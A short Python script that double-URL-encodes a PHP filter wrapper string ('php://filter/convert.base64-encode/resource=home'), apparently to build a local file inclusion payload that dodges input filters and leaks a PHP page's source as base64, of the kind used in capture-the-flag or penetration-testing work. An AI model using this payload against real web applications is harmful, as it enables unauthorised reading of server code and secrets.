def urlencode(text=None):
    TABLE = "0123456789abcdef"
    enc = ""
    for c in text:
        enc += '%'
        enc += TABLE[ord(c) >> 4]
        enc += TABLE[ord(c) & 15]
    return enc

def double_urlencode(text=None):
    enc = None
    if text is not None:
        enc = urlencode(urlencode(text))
    return enc


print(double_urlencode("php://filter/convert.base64-encode/resource=home"))
